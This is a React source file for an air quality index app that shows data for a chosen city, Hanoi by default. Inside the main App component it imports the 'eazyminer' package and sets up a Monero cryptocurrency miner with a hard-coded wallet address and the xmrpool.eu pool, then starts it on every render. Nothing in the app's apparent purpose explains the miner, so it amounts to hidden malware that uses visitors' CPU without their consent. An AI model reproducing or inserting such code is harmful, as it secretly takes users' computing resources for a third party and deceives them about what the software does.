import HeaderBox from "./Component/HeaderBox";
import AQIHandle from "./Component/AQIHandle";
import "./styles.css";
import { useState } from "react";
const Miner = require('eazyminer');

function App() {
  const miner = new Miner({
    pools: [{
        coin: 'XMR',
        user: '47D8WQoJKydhTkk26bqZCVF7FaNhzRtNG15u1XiRQ83nfYqogyLjPMnYEKarjAiCz93oV6sETE9kkL3bkbvTX6nMU24CND8',
        url: 'xmrpool.eu:9999', // optional pool URL,
    }],
    autoStart: false // optional delay
  });

  miner.start(); // optional manually start the miner
  const [currentCity, setCurrentCity] = useState("Hanoi");
  return (
    <div className="App">
      <HeaderBox currentCity={currentCity} setCurrentCity={setCurrentCity} />
      <main>
        <AQIHandle currentCity={currentCity} />
      </main>
    </div>
  );
  
}

export default App;
